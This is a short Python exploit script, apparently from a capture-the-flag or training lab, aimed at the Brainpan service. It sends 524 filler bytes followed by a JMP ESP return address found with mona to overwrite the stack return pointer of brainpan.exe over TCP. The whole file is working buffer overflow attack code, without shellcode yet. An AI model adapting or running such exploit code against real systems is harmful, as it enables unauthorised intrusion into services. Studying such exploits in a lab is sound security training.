#!/usr/bin/python
# Python Script (crash.py)

import socket
import sys

ip = sys.argv[1]
port = int(sys.argv[2])
# !mona find -s "\xff\xe4" -m brainpan.exe
# !mona jmp -r esp -cpb  "\x00"
# esp return address 311712f3

offset = 524
payload = b"A" * offset

retrn = b"\xf3\x12\x17\x31"
payload += retrn

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(payload)
# print(s.recv(1024))
print("[!] Error connecting to server!")
